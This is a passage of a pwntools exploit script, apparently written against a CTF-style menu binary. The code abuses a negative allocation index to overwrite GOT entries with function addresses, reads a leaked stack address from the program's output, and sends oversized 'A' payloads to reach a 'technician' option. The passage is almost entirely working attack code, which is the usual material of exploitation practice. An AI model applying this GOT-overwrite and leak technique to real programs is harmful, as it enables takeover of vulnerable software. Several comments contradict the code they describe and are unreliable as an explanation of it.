allocate got of exit
io.sendline(b'1')
io.sendline(b'-8')
log.info(f'allocate: {hex(elf.got["strcmp"])}')

rop = ROP(elf)
io.sendline(str(0x401140).encode())  # replacing atoi with atoi
io.sendline(str(elf.sym['printf']).encode()) # replacing scanf with puts
io.sendline(b'y')


# stack leak
print(io.clean().decode())
io.sendline(b'1')
io.sendline(b'1')
io.recvuntil(b'Thrust: ')
stack_leak = int(io.recv(15).decode())
log.info(f"got stack leak: {hex(stack_leak)}")
io.sendline(b'y')


# print(io.clean().decode())
# restarting main
io.sendlineafter(b'Option [1-5]:', b'12')
io.sendlineafter(b'username: ', b'A'*256)
io.sendlineafter(b'size', b'256')
io.sendlineafter(b'new username: ', b'A'*254)

# get technician
io.sendline(b'5')
io.sendline(b'1')